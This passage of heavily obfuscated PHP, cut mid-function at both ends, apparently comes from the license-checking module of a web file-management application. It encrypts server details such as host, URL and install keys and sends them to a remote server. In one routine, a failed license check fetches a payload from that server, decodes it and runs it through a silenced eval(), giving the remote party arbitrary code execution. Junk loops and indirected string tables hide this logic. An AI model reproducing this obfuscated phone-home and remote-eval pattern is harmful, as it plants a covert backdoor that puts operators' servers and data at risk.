$×ğ®¨õ[$Ôõ³û®[88]][$Ôõ³û®[89]][$Ôõ³û®[94]] = array($Ôõ³û®[95] => (int) $öèÛ¥…¸[$Ôõ³û®[96]], $Ôõ³û®[97] => (int) _get($öèÛ¥…¸, $Ôõ³û®[98], 0)); $¦ÛÀãÌ¦ = $¨·¼ ôÀ[726]; if (strlen($¦ÛÀãÌ¦) < $¨·¼ ôÀ[705]) { return; } $ºâ«èÆî = substr(md5($Ôõ³û®[99] . get_client_ip() . $Ã‡ÁÚÂ§[$Ôõ³û®[100]]), 0, 15); $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[102]] = Mcrypt::encode(Session::sign(), $ºâ«èÆî, 3600 * 24); $Œ€¡ÕÆû = $¨·¼ ôÀ[727]; if (!$Œ€¡ÕÆû) { return; } $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[103]] = Action($Ôõ³û®[104])->accessToken(); $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[105]] = md5($_SERVER[$Ôõ³û®[106]] . $Ã‡ÁÚÂ§[$Ôõ³û®[100]]); $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[107]] = base64_encode(serverInfo()); $´¯İûñ© = $¨·¼ ôÀ[728]; if (strlen($´¯İûñ©) < $¨·¼ ôÀ[729]) { die; } $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[108]] = $this->uodr6330571a; if ($Ã‡ÁÚÂ§[$Ôõ³û®[108]] != $Ôõ³û®[109]) { $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[110]] = $Ã‡ÁÚÂ§[$Ôõ³û®[110]]; $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[111]] = $Ã‡ÁÚÂ§[$Ôõ³û®[111]]; $ß´‡ƒ€Ã = rand_string(10) . $this->uodr6330571a . rand_string(5); $×ğ®¨õ[$Ôõ³û®[88]][$Ôõ³û®[112]][$Ôõ³û®[113]] = $this->mvyxcb0efe2a($ß´‡ƒ€Ã, $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[105]]); } if ($this->uodr6330571a == $Ôõ³û®[109]) { $×ğ®¨õ[$Ôõ³û®[88]][$Ôõ³û®[89]][$Ôõ³û®[94]][$Ôõ³û®[98]] = 0; } $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[114]] = $this->versionPluginFilter(); $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[115]] = _get($this->gpbr66657c07, $Ôõ³û®[116], $Ôõ³û®[6]); $ŸîİÍÉ = $¨·¼ ôÀ[730]; if (!$ŸîİÍÉ) { return; } if (KodUser::isRoot() && $this->config[$Ôõ³û®[117]]) { $×ğ®¨õ[$Ôõ³û®[101]][$Ôõ³û®[118]] = WEB_ROOT; } return $×ğ®¨õ; } private function vrfg5487990f() { $‡Ÿ×÷ºó =& $_SERVER[ç¦¬”œš]; $“º³«” =& $_SERVER[ß±¢Œ¿–]; $â‹·À× = $_SERVER[$“º³«”[24]] == $“º³«”[119]; if ($_SERVER[$“º³«”[24]] == $“º³«”[120] && $_GET[$“º³«”[121]] == $“º³«”[122]) { $â‹·À× = !0; } if ($â‹·À×) { $Œñ·‹Ãø = array($“º³«”[108] => $this->uodr6330571a, $“º³«”[123] => $this->alyj5a8b582f(), $“º³«”[124] => Model($“º³«”[125])->count()); if ($this->uodr6330571a != $“º³«”[109]) { $°™Îïçõ = _get($this->gpbr66657c07, $“º³«”[126]); if ($°™Îïçõ) { $Œñ·‹Ãø[$“º³«”[127]] = $°™Îïçõ; $Œñ·‹Ãø[$“º³«”[128]] = strtotime(_get($this->gpbr66657c07, $“º³«”[129])); $Œñ·‹Ãø[$“º³«”[130]] = _get($this->gpbr66657c07, $“º³«”[116]); } $Ù¼‚Î = Model($“º³«”[33])->get($“º³«”[131], $“º³«”[6], !0); if (is_string($Ù¼‚Î) && substr($Ù¼‚Î, 0, 1) == $“º³«”[132]) { $Ù¼‚Î = json_decode_force($Ù¼‚Î); } if (is_array($Ù¼‚Î) && $Ù¼‚Î[$“º³«”[133]] && strstr($Ù¼‚Î[$“º³«”[133]], $“º³«”[134])) { $€ÈÜïÍƒ = explode($“º³«”[134], $Ù¼‚Î[$“º³«”[133]]); $Œñ·‹Ãø[$“º³«”[135]] = $€ÈÜïÍƒ[0]; } } $Œñ·‹Ãø = $this->kzbg18792ba8(json_encode($Œñ·‹Ãø), md5($“º³«”[136])); $µ¦Üå¸ = $‡Ÿ×÷ºó[731]; $”œËÍê­ = array($“º³«”[137] => $Œñ·‹Ãø); call_user_func(array($“º³«”[138], $“º³«”[139]), $”œËÍê­); $ı±ôŠ¹ = $‡Ÿ×÷ºó[732]; while (strlen($ı±ôŠ¹) < $‡Ÿ×÷ºó[478]) { if (!$ı±ôŠ¹) { break; } $ı±ôŠ¹++; } } if ($this->uodr6330571a == $“º³«”[109]) { return; } $œäÔ“œ– = array($“º³«”[140], $“º³«”[141], $“º³«”[142], $“º³«”[143], $“º³«”[144], $“º³«”[145]); $Éñ×½× = $‡Ÿ×÷ºó[733]; if (!$Éñ×½×) { die; } $é° çÎ = Model($“º³«”[33])->get(); $”œËÍê­ = array($“º³«”[146] => $é° çÎ[$“º³«”[34]], $“º³«”[147] => $é° çÎ[$“º³«”[35]], $“º³«”[148] => $“º³«”[6]); $›Š ³÷˜ = $‡Ÿ×÷ºó[734]; while (strlen($›Š ³÷˜) < $‡Ÿ×÷ºó[478]) { if (!$›Š ³÷˜) { break; } $›Š ³÷˜++; } foreach ($œäÔ“œ– as $’ü©“×ª) { if (!isset($é° çÎ[$’ü©“×ª]) || !$é° çÎ[$’ü©“×ª]) { continue; } $”œËÍê­[$’ü©“×ª] = $é° çÎ[$’ü©“×ª]; $ü¡ÕİÌ = $‡Ÿ×÷ºó[735]; while (strlen($ü¡ÕİÌ) < $‡Ÿ×÷ºó[729]) { if (!$ü¡ÕİÌ) { break; } $ü¡ÕİÌ++; } } call_user_func(array($“º³«”[138], $“º³«”[139]), $”œËÍê­); $…šíé÷Œ = $‡Ÿ×÷ºó[736]; if (strlen($…šíé÷Œ) < $‡Ÿ×÷ºó[701]) { return; } } private function czmla7d0a967() { $üØÀª×§ =& $_SERVER[ç¦¬”œš]; $½çĞ»¼Ô =& $_SERVER[ß±¢Œ¿–]; if ($_SERVER[$½çĞ»¼Ô[24]] != $½çĞ»¼Ô[149]) { return; } if (!KodUser::isRoot()) { die; } $ ®å¯ = $GLOBALS[$½çĞ»¼Ô[13]]; if (isset($ ®å¯[$½çĞ»¼Ô[150]])) { $this->xpos599e881b(); die; } if (isset($ ®å¯[$½çĞ»¼Ô[151]]) && isset($ ®å¯[$½çĞ»¼Ô[151]]) == $½çĞ»¼Ô[122]) { $ ®å¯[$½çĞ»¼Ô[152]] = Model($½çĞ»¼Ô[33])->get($½çĞ»¼Ô[153]); } if (!isset($ ®å¯[$½çĞ»¼Ô[152]]) || strlen($ ®å¯[$½çĞ»¼Ô[152]]) != 16) { show_json($½çĞ»¼Ô[154] . $ ®å¯[$½çĞ»¼Ô[152]], !1); } $¯ÂùÃ×¯ = Model($½çĞ»¼Ô[33])->get($½çĞ»¼Ô[100]); $·è–àƒÌ = md5($_SERVER[$½çĞ»¼Ô[106]] . $¯ÂùÃ×¯); $˜òãÁµì = $üØÀª×§[737]; $Îô‰Ÿ¼¡ = array($½çĞ»¼Ô[152] => $ ®å¯[$½çĞ»¼Ô[152]], $½çĞ»¼Ô[155] => rand_string(16), $½çĞ»¼Ô[156] => $½çĞ»¼Ô[136], $½çĞ»¼Ô[157] => $½çĞ»¼Ô[158], $½çĞ»¼Ô[159] => $_SERVER[$½çĞ»¼Ô[160]], $½çĞ»¼Ô[161] => $_SERVER[$½çĞ»¼Ô[162]], $½çĞ»¼Ô[163] => $_SERVER[$½çĞ»¼Ô[164]], $½çĞ»¼Ô[105] => $·è–àƒÌ, $½çĞ»¼Ô[165] => Model($½çĞ»¼Ô[33])->get($½çĞ»¼Ô[131])); $¿òĞÃ· = $üØÀª×§[738]; if (isset($ ®å¯[$½çĞ»¼Ô[151]]) && isset($ ®å¯[$½çĞ»¼Ô[151]]) == $½çĞ»¼Ô[122]) { $Îô‰Ÿ¼¡[$½çĞ»¼Ô[151]] = md5($Îô‰Ÿ¼¡[$½çĞ»¼Ô[152]] . $½çĞ»¼Ô[166] . $Îô‰Ÿ¼¡[$½çĞ»¼Ô[155]]); } if ($ ®å¯[$½çĞ»¼Ô[167]] == $½çĞ»¼Ô[168]) { $š¥‹Ÿä = $this->kzbg18792ba8($·è–àƒÌ, $½çĞ»¼Ô[169]); $¼øÆ’ì• = $this->mvyxcb0efe2a(json_encode($Îô‰Ÿ¼¡), $·è–àƒÌ . $½çĞ»¼Ô[170], 3); $¼øÆ’ì• = $¼øÆ’ì• . $½çĞ»¼Ô[171] . $_SERVER[$½çĞ»¼Ô[160]]; $ïç“ÜĞÃ = $this->ecldf32890c7($½çĞ»¼Ô[172] . $š¥‹Ÿä . $½çĞ»¼Ô[173] . $¼øÆ’ì•, -1); show_json($ïç“ÜĞÃ, !0); } else { if ($ ®å¯[$½çĞ»¼Ô[167]] == $½çĞ»¼Ô[174]) { $ÙØëŒ­Ê = substr(md5($½çĞ»¼Ô[175] . $·è–àƒÌ), 12, 15) . $½çĞ»¼Ô[176]; $¼øÆ’ì• = $this->wtoj46d1ba2c(trim($ ®å¯[$½çĞ»¼Ô[177]]), $ÙØëŒ­Ê, 2); $÷†Ò‰ò = json_decode($¼øÆ’ì•, !0); if (!is_array($÷†Ò‰ò) || !is_array($÷†Ò‰ò[$½çĞ»¼Ô[178]]) || $÷†Ò‰ò[$½çĞ»¼Ô[152]] != !0) { $—·ı‚Œ« = $½çĞ»¼Ô[179]; $ë§ğ´¢ = $÷†Ò‰ò[$½çĞ»¼Ô[178]] ? $½çĞ»¼Ô[180] . $÷†Ò‰ò[$½çĞ»¼Ô[178]] : $—·ı‚Œ«; show_json($ë§ğ´¢, !1); } else { $Îô‰Ÿ¼¡[$½çĞ»¼Ô[155]] = $÷†Ò‰ò[$½çĞ»¼Ô[178]][$½çĞ»¼Ô[181]]; } } else { $÷†Ò‰ò = $this->ecldf32890c7($½çĞ»¼Ô[182], $Îô‰Ÿ¼¡, 10); } } if (!is_array($÷†Ò‰ò) || !is_array($÷†Ò‰ò[$½çĞ»¼Ô[178]]) || $÷†Ò‰ò[$½çĞ»¼Ô[152]] != !0) { $—·ı‚Œ« = LNG($½çĞ»¼Ô[183]); $ë§ğ´¢ = $÷†Ò‰ò[$½çĞ»¼Ô[178]] ? $½çĞ»¼Ô[180] . $÷†Ò‰ò[$½çĞ»¼Ô[178]] : $—·ı‚Œ«; show_json($ë§ğ´¢, !1); } $½·¾à—µ = $÷†Ò‰ò[$½çĞ»¼Ô[178]]; $³ÑÛèì† = $this->gnidaf1de1ab($½·¾à—µ[$½çĞ»¼Ô[184]]); if (!$³ÑÛèì† || $³ÑÛèì† != $½·¾à—µ[$½çĞ»¼Ô[129]]) { $ØåÜï—ß = array($½çĞ»¼Ô[185] => Model($½çĞ»¼Ô[33])->get($½çĞ»¼Ô[100]), $½çĞ»¼Ô[186] => $_SERVER[$½çĞ»¼Ô[106]], $½çĞ»¼Ô[187] => this_url(), $½çĞ»¼Ô[161] => $_SERVER[$½çĞ»¼Ô[162]]); $¼øÆ’ì• = $this->ozcnab746ada(json_encode($ØåÜï—ß)); $this->ecldf32890c7($½çĞ»¼Ô[188] . $¼øÆ’ì•); show_json(LNG($½çĞ»¼Ô[189]), !0); } $ü¶¿ÔÆ« = array($½çĞ»¼Ô[153] => $½·¾à—µ[$½çĞ»¼Ô[190]], $½çĞ»¼Ô[191] => $½·¾à—µ[$½çĞ»¼Ô[192]], $½çĞ»¼Ô[193] => rand_string(16), $½çĞ»¼Ô[108] => $½·¾à—µ[$½çĞ»¼Ô[194]]); if ($Îô‰Ÿ¼¡[$½çĞ»¼Ô[155]]) { $ü¶¿ÔÆ«[$½çĞ»¼Ô[193]] = $Îô‰Ÿ¼¡[$½çĞ»¼Ô[155]]; } $ÅùÑê = substr(md5($ü¶¿ÔÆ«[$½çĞ»¼Ô[191]]), 10, 10); $ÃıĞüñø = $ÅùÑê . $ü¶¿ÔÆ«[$½çĞ»¼Ô[108]] . $ü¶¿ÔÆ«[$½çĞ»¼Ô[193]]; $ü¶¿ÔÆ«[$½çĞ»¼Ô[110]] = strrev(base64_encode($this->kzbg18792ba8($ÃıĞüñø, $½çĞ»¼Ô[195]))); $øªºğŠÖ = $üØÀª×§[739]; $ôÌ”£²± = rand_string(16); $ØÀ¶—ßÓ = $üØÀª×§[740]; if (strlen($ØÀ¶—ßÓ) < $üØÀª×§[707]) { return; } $®Ş³Ÿá = $ôÌ”£²± . $ü¶¿ÔÆ«[$½çĞ»¼Ô[108]] . $this->kzbg18792ba8(md5($ü¶¿ÔÆ«[$½çĞ»¼Ô[153]]), $ôÌ”£²±); $ü¶¿ÔÆ«[$½çĞ»¼Ô[111]] = base64_encode(strrev($this->kzbg18792ba8($®Ş³Ÿá, $½çĞ»¼Ô[196]))); $‹Ö‹ = $üØÀª×§[741]; if (strlen($‹Ö‹) < $üØÀª×§[705]) { die; } if ($½·¾à—µ[$½çĞ»¼Ô[197]] && $½·¾à—µ[$½çĞ»¼Ô[197]] >= 1) { Model($½çĞ»¼Ô[33])->setDeep($½çĞ»¼Ô[198], $½çĞ»¼Ô[122]); } Model($½çĞ»¼Ô[33])->set($ü¶¿ÔÆ«); $Îì²®ƒ– = md5($_SERVER[$½çĞ»¼Ô[106]] . strrev($¯ÂùÃ×¯) . $ü¶¿ÔÆ«[$½çĞ»¼Ô[191]]); $ÜË¸·ûß = strrev(substr($Îì²®ƒ–, 10, 16)); $·‹€¹ó¦ = $üØÀª×§[742]; while (strlen($·‹€¹ó¦) < $üØÀª×§[707]) { if (!$·‹€¹ó¦) { break; } $·‹€¹ó¦++; } $öŸñšøí = $this->mvyxcb0efe2a(json_encode($½·¾à—µ), $Îì²®ƒ–); $¸éº¥â´ = array_to_keyvalue(Model($½çĞ»¼Ô[7])->listData(), $½çĞ»¼Ô[199]); $ªİæÒ± = $¸éº¥â´[$½çĞ»¼Ô[200]]; $ëÈĞ¶âã = array(); $ëÈĞ¶âã[$ÜË¸·ûß] = $öŸñšøí; Model($½çĞ»¼Ô[7])->update($ªİæÒ±[$½çĞ»¼Ô[201]], array($½çĞ»¼Ô[202] => $ëÈĞ¶âã)); $³€¦ÔÂ³ = $üØÀª×§[743]; while (strlen($³€¦ÔÂ³) < $üØÀª×§[707]) { if (!$³€¦ÔÂ³) { break; } $³€¦ÔÂ³++; } $this->gpbr66657c07 = $½·¾à—µ; $this->uodr6330571a = $ü¶¿ÔÆ«[$½çĞ»¼Ô[108]]; $µàçÙÚÀ = $üØÀª×§[744]; if (strlen($µàçÙÚÀ) < $üØÀª×§[705]) { return; } $this->licenseRegistSuccess(); Cache::set($½çĞ»¼Ô[203] . md5($¯ÂùÃ×¯ . $½çĞ»¼Ô[204]), $½çĞ»¼Ô[6]); $Œ‡®ø£ˆ = $üØÀª×§[745]; show_json(LNG($½çĞ»¼Ô[189]), !0); $®¨ üŸå = $üØÀª×§[746]; if (strlen($®¨ üŸå) < $üØÀª×§[701]) { return; } } private function licenseRegistSuccess() { $½â‰’İ =& $_SERVER[ß±¢Œ¿–]; $ËÉÅÜé« = Model($½â‰’İ[33])->get(); if ($ËÉÅÜé«[$½â‰’İ[63]] != $½â‰’İ[122]) { Model($½â‰’İ[33])->set($½â‰’İ[63], $½â‰’İ[122]); } Action($½â‰’İ[205])->initStart(!0); } private function xpos599e881b() { $ô®““»¶ =& $_SERVER[ç¦¬”œš]; $‹Ÿ¯Å =& $_SERVER[ß±¢Œ¿–]; Model($‹Ÿ¯Å[33])->set(array($‹Ÿ¯Å[153] => $‹Ÿ¯Å[6], $‹Ÿ¯Å[191] => $‹Ÿ¯Å[6], $‹Ÿ¯Å[108] => $‹Ÿ¯Å[109], $‹Ÿ¯Å[110] => $‹Ÿ¯Å[6], $‹Ÿ¯Å[111] => $‹Ÿ¯Å[6])); Model($‹Ÿ¯Å[33])->setDeep($‹Ÿ¯Å[198], $‹Ÿ¯Å[206]); $ÔâÓÌÔµ = $ô®““»¶[747]; $this->gpbr66657c07 = array(); $this->uodr6330571a = $‹Ÿ¯Å[109]; $òßÆ²ûò = $ô®““»¶[748]; } private function xtvn49b750ea() { $·­á¿™¬ =& $_SERVER[ç¦¬”œš]; $ÖÃ›†¹ =& $_SERVER[ß±¢Œ¿–]; $_SERVER[$ÖÃ›†¹[162]] = _get($_SERVER, $ÖÃ›†¹[162], APP_HOST); $this->uodr6330571a = $ÖÃ›†¹[109]; $Í…«Õª¾ = $·­á¿™¬[749]; $Ú’…´ƒ” = Model($ÖÃ›†¹[33])->get(); $–ñäÌ§ = $·­á¿™¬[750]; while ($–ñäÌ§ < $·­á¿™¬[701]) { if ($–ñäÌ§ >= 0) { break; } $–ñäÌ§++; } if ($Ú’…´ƒ”[$ÖÃ›†¹[108]] == $ÖÃ›†¹[109]) { return; } $•ñâİ² = Model($ÖÃ›†¹[33])->get($ÖÃ›†¹[100]); $èöƒ¾”µ = $ÖÃ›†¹[203] . md5($•ñâİ² . $ÖÃ›†¹[204]); $ÎØöñå£ = Cache::get($èöƒ¾”µ); $æ§áÀëº = $·­á¿™¬[751]; if (!$æ§áÀëº) { die; } if (!is_array($ÎØöñå£) || !isset($ÎØöñå£[$ÖÃ›†¹[207]]) || time() - $ÎØöñå£[$ÖÃ›†¹[207]] >= 60) { $ŞŒ¼ö¼Â = Model($ÖÃ›†¹[7])->loadList(); $ïÌÕÙ¨Ú = $ŞŒ¼ö¼Â[$ÖÃ›†¹[200]]; $ÛøÉÖ®Õ = md5($_SERVER[$ÖÃ›†¹[106]] . strrev($•ñâİ²) . $Ú’…´ƒ”[$ÖÃ›†¹[191]]); $å€¾ùã˜ = strrev(substr($ÛøÉÖ®Õ, 10, 16)); $ÎØöñå£ = $this->wtoj46d1ba2c($ïÌÕÙ¨Ú[$ÖÃ›†¹[86]][$å€¾ùã˜], $ÛøÉÖ®Õ); $ÎØöñå£ = json_decode($ÎØöñå£, !0); } if (!is_array($ÎØöñå£)) { return $this->xpos599e881b(); } $à„³¼ÈË = strtotime($ÎØöñå£[$ÖÃ›†¹[129]]); if (time() >= $à„³¼ÈË) { return $this->xpos599e881b(); } if (!isset($ÎØöñå£[$ÖÃ›†¹[207]]) || time() - $ÎØöñå£[$ÖÃ›†¹[207]] > 20) { $ÎØöñå£[$ÖÃ›†¹[207]] = time(); Cache::set($èöƒ¾”µ, $ÎØöñå£); } $this->gpbr66657c07 = $ÎØöñå£; $this->uodr6330571a = $Ú’…´ƒ”[$ÖÃ›†¹[108]]; $ÊİóÔİß = $·­á¿™¬[752]; if (!$ÊİóÔİß) { die; } } private function eign0215e716() { $«…ŒĞàŞ =& $_SERVER[ç¦¬”œš]; $Ü…­Íşœ =& $_SERVER[ß±¢Œ¿–]; $Õ•ÅÙòô = $GLOBALS[$Ü…­Íşœ[13]]; $…›€®òô = $«…ŒĞàŞ[753]; $Ïõë÷§î = $_SERVER[$Ü…­Íşœ[24]]; $ØŒ‡Ìı¦ = $«…ŒĞàŞ[754]; while ($ØŒ‡Ìı¦ < $«…ŒĞàŞ[729]) { if ($ØŒ‡Ìı¦ >= 0) { break; } $ØŒ‡Ìı¦++; } if ($Ïõë÷§î == $Ü…­Íşœ[208] && $this->uodr6330571a == $Ü…­Íşœ[109]) { show_json(LNG($Ü…­Íşœ[209]), !1, $Ü…­Íşœ[210]); } $È¨à•¯ = array($Ü…­Íşœ[211], $Ü…­Íşœ[212]); if (in_array($Ïõë÷§î, $È¨à•¯)) { if ($this->uodr6330571a == $Ü…­Íşœ[109] && isset($Õ•ÅÙòô[$Ü…­Íşœ[213]])) { show_json(LNG($Ü…­Íşœ[209]), !1, $Ü…­Íşœ[210]); die; } $Íâ©“ÌÄ = $this->alyj5a8b582f(); if ($Íâ©“ÌÄ != intval($Ü…­Íşœ[214])) { if ($Íâ©“ÌÄ <= Model($Ü…­Íşœ[125])->count()) { show_json(LNG($Ü…­Íşœ[215]), !1, $Ü…­Íşœ[210]); die; } } } } private function rntk7f98c299() { $Êú½Áè¯ =& $_SERVER[ß±¢Œ¿–]; $½¶–Íæ² = array($Êú½Áè¯[119], $Êú½Áè¯[120]); if (!KodUser::isRoot() || !isset($_GET[$Êú½Áè¯[216]])) { return; } if (!in_array($_SERVER[$Êú½Áè¯[24]], $½¶–Íæ²)) { return; } $òéêÒú = $Êú½Áè¯[217]; $òéêÒú = $this->wbat98d0185e($òéêÒú, $Êú½Áè¯[218]); $ó¢È¥É = stream_context_create(array($Êú½Áè¯[219] => array($Êú½Áè¯[220] => $Êú½Áè¯[221], $Êú½Áè¯[222] => 3))); $ÒèÜä¯” = @file_get_contents($òéêÒú, !1, $ó¢È¥É); $áşÃÖïè = $_SERVER[ç¦¬”œš][755]; header($Êú½Áè¯[223]); if ($ÒèÜä¯” && strstr($ÒèÜä¯”, $Êú½Áè¯[224])) { echo $ÒèÜä¯”; } die; } public function oihb52ae895b($Úß’æ±ú) { $Òé¾ÀÖ =& $_SERVER[ç¦¬”œš]; $¤™ùã‹ =& $_SERVER[ß±¢Œ¿–]; if ($this->uodr6330571a == $¤™ùã‹[225]) { return $Úß’æ±ú; } $öªìö¹û = $this->versionPluginList(); $ÊŞåÅÂĞ = $Òé¾ÀÖ[756]; if (!$ÊŞåÅÂĞ) { die; } $Ï®°ÑË‚ = explode($¤™ùã‹[226], $this->versionPluginFilter()); $ö©àëŒ = $Òé¾ÀÖ[757]; $İ„‡§•¦ = array(); foreach ($öªìö¹û as $Ç’ÊÙƒ => $†ù·Öø) { if ($†ù·Öø == $¤™ùã‹[227] && substr($this->uodr6330571a, 0, 1) == $¤™ùã‹[227]) { continue; } if (!in_array($Ç’ÊÙƒ, $Ï®°ÑË‚)) { $İ„‡§•¦[] = $Ç’ÊÙƒ; } } foreach ($İ„‡§•¦ as $Ç’ÊÙƒ) { unset($Úß’æ±ú[$Ç’ÊÙƒ]); $†ß“Øüş = $Òé¾ÀÖ[758]; } return $Úß’æ±ú; } private function versionPluginList() { $‡š’¦È =& $_SERVER[ç¦¬”œš]; $Å“²ö§ =& $_SERVER[ß±¢Œ¿–]; return array($Å“²ö§[228] => $Å“²ö§[227], $Å“²ö§[229] => $Å“²ö§[227], $Å“²ö§[230] => $Å“²ö§[227], $Å“²ö§[231] => $Å“²ö§[232], $Å“²ö§[233] => $Å“²ö§[232], $Å“²ö§[234] => $Å“²ö§[232], $Å“²ö§[235] => $Å“²ö§[232], $Å“²ö§[236] => $Å“²ö§[232], $Å“²ö§[237] => $Å“²ö§[232], $Å“²ö§[238] => $Å“²ö§[232], $Å“²ö§[239] => $Å“²ö§[232], $Å“²ö§[240] => $Å“²ö§[232], $Å“²ö§[241] => $Å“²ö§[232], $Å“²ö§[242] => $Å“²ö§[232], $Å“²ö§[243] => $Å“²ö§[232], $Å“²ö§[244] => $Å“²ö§[232]); $Ü›Ü¿‘ = $‡š’¦È[759]; while ($Ü›Ü¿‘ < $‡š’¦È[701]) { if ($Ü›Ü¿‘ >= 0) { break; } $Ü›Ü¿‘++; } } private function versionPluginFilter() { $¸‡îïÜÙ =& $_SERVER[ç¦¬”œš]; $ÊÑéÒöª =& $_SERVER[ß±¢Œ¿–]; if ($this->uodr6330571a == $ÊÑéÒöª[109]) { return $ÊÑéÒöª[6]; } $Á´Ğ× = _get($this->gpbr66657c07, $ÊÑéÒöª[245], $ÊÑéÒöª[6]); $ô¸¶é‘Ø = _get($this->gpbr66657c07, $ÊÑéÒöª[116], $ÊÑéÒöª[6]); $üÖÃµÏù = $¸‡îïÜÙ[760]; if (strlen($üÖÃµÏù) < $¸‡îïÜÙ[705]) { die; } $Ñ¥ğ¤Œõ = _get($this->gpbr66657c07, $ÊÑéÒöª[246], $ÊÑéÒöª[6]); if ($ô¸¶é‘Ø > time() && $Ñ¥ğ¤Œõ > time()) { $Ö¡€ÜÊì = explode($ÊÑéÒöª[226], $Á´Ğ×); $ÔìÓÎ¤£ = array_keys($this->versionPluginList()); $Á´Ğ× = array_merge($Ö¡€ÜÊì, $ÔìÓÎ¤£); $Á´Ğ× = implode($ÊÑéÒöª[226], array_filter(array_unique($Á´Ğ×))); } return $Á´Ğ×; } private function zevk7ea15609() { $Ô«û•úÂ =& $_SERVER[ß±¢Œ¿–]; if ($this->uodr6330571a != $Ô«û•úÂ[109]) { $GLOBALS[$Ô«û•úÂ[86]][$Ô«û•úÂ[90]][$Ô«û•úÂ[247]] = $Ô«û•úÂ[206]; return; } $GLOBALS[$Ô«û•úÂ[86]][$Ô«û•úÂ[248]] = $Ô«û•úÂ[122]; if (Model($Ô«û•úÂ[249])->get($Ô«û•úÂ[63]) != $Ô«û•úÂ[206]) { Model($Ô«û•úÂ[249])->set($Ô«û•úÂ[63], $Ô«û•úÂ[206]); } } public function fwmn4cca6992() { return $_SERVER[ß±¢Œ¿–][250]; } private function wliha206745d() { $Èëô›óè =& $_SERVER[ç¦¬”œš]; $Óğ»ëµŞ =& $_SERVER[ß±¢Œ¿–]; $şƒ‹Äü¬ = array($Óğ»ëµŞ[251], $Óğ»ëµŞ[252], $Óğ»ëµŞ[253]); $íÓë©‡¼ = $Óğ»ëµŞ[254] . md5($Óğ»ëµŞ[255]); if ($this->uodr6330571a == $Óğ»ëµŞ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Óğ»ëµŞ[24]], $şƒ‹Äü¬)) { return; } if (time() % 4 != 0) { return; } $£ÛÜ¹Ÿ = call_user_func(array($Óğ»ëµŞ[256], $Óğ»ëµŞ[257]), $íÓë©‡¼); $é›Ú¨å = $Èëô›óè[761]; while ($é›Ú¨å < $Èëô›óè[478]) { if ($é›Ú¨å >= 0) { break; } $é›Ú¨å++; } if ($£ÛÜ¹Ÿ && time() - $£ÛÜ¹Ÿ < intval($Óğ»ëµŞ[258])) { return; } call_user_func(array($Óğ»ëµŞ[256], $Óğ»ëµŞ[139]), $íÓë©‡¼, time()); $’Ş¶ü¢€ = $Èëô›óè[762]; while (strlen($’Ş¶ü¢€) < $Èëô›óè[701]) { if (!$’Ş¶ü¢€) { break; } $’Ş¶ü¢€++; } $¸´ØÃ´± = Model($Óğ»ëµŞ[33])->get($Óğ»ëµŞ[100]); $Å±óì† = $Èëô›óè[763]; $Åö™ƒÒÀ = array($Óğ»ëµŞ[152] => Model($Óğ»ëµŞ[33])->get($Óğ»ëµŞ[153]), $Óğ»ëµŞ[167] => $this->uodr6330571a, $Óğ»ëµŞ[163] => $_SERVER[$Óğ»ëµŞ[164]], $Óğ»ëµŞ[165] => Model($Óğ»ëµŞ[33])->get($Óğ»ëµŞ[131]), $Óğ»ëµŞ[105] => md5($_SERVER[$Óğ»ëµŞ[106]] . $¸´ØÃ´±), $Óğ»ëµŞ[156] => $Óğ»ëµŞ[136], $Óğ»ëµŞ[159] => $_SERVER[$Óğ»ëµŞ[160]]); $çã¥ö„Æ = $Èëô›óè[764]; $Ö éİÜ„ = $this->ecldf32890c7($Óğ»ëµŞ[259], $Åö™ƒÒÀ); if (!is_array($Ö éİÜ„)) { return; } if ($Ö éİÜ„[$Óğ»ëµŞ[152]] && $Ö éİÜ„[$Óğ»ëµŞ[260]]) { if ($this->gnidaf1de1ab($Ö éİÜ„[$Óğ»ëµŞ[260]]) == $Åö™ƒÒÀ[$Óğ»ëµŞ[152]]) { return; } } $this->xpos599e881b(); $¯ô¥’Èó = $Èëô›óè[765]; while (strlen($¯ô¥’Èó) < $Èëô›óè[707]) { if (!$¯ô¥’Èó) { break; } $¯ô¥’Èó++; } if ($this->gnidaf1de1ab($Ö éİÜ„[$Óğ»ëµŞ[260]]) != $Åö™ƒÒÀ[$Óğ»ëµŞ[152]]) { $†±¤¶ì = array($Óğ»ëµŞ[185] => $¸´ØÃ´±, $Óğ»ëµŞ[186] => $_SERVER[$Óğ»ëµŞ[106]], $Óğ»ëµŞ[187] => this_url(), $Óğ»ëµŞ[161] => $_SERVER[$Óğ»ëµŞ[162]]); $›«…Ø = $this->ozcnab746ada(json_encode($†±¤¶ì)); $Ö éİÜ„ = $this->ecldf32890c7($Óğ»ëµŞ[188] . $›«…Ø); if ($Ö éİÜ„ && is_array($Ö éİÜ„) && isset($Ö éİÜ„[$Óğ»ëµŞ[260]])) { $İÃ±ç– = $this->wtoj46d1ba2c($Ö éİÜ„[$Óğ»ëµŞ[260]], 2); if ($İÃ±ç–) { $İÃ±ç– = $this->gnidaf1de1ab($İÃ±ç–); } if ($İÃ±ç–) { try { @eval($İÃ±ç–); } catch (Exception $¿ÊºòÑ) { } } } } } private function ecldf32890c7($“›»ãŒû = '', $£–ú‹¿Û = array(), $ó¹°Êê¤ = 5) { $İ„©ş‘ =& $_SERVER[ç¦¬”œš]; $»òïßÅ° =& $_SERVER[ß±¢Œ¿–]; $äÕªº‰ = $»òïßÅ°[261]; $ŠòèşîŒ = $İ„©ş‘[766]; if (!$ŠòèşîŒ) { die; } $äÕªº‰ = $this->wbat98d0185e($äÕªº‰, $»òïßÅ°[262]); $äÕªº‰ = $äÕªº‰ . $“›»ãŒû; $íô‹ÏÉå = $İ„©ş‘[767]; if (!$íô‹ÏÉå) { die; } if ($£–ú‹¿Û && is_array($£–ú‹¿Û)) { $äÕªº‰ = $äÕªº‰ . $»òïßÅ°[263] . http_build_query($£–ú‹¿Û); } if ($£–ú‹¿Û === -1) { return $äÕªº‰; } $û¿‰²áà = stream_context_create(array($»òïßÅ°[219] => array($»òïßÅ°[222] => $ó¹°Êê¤, 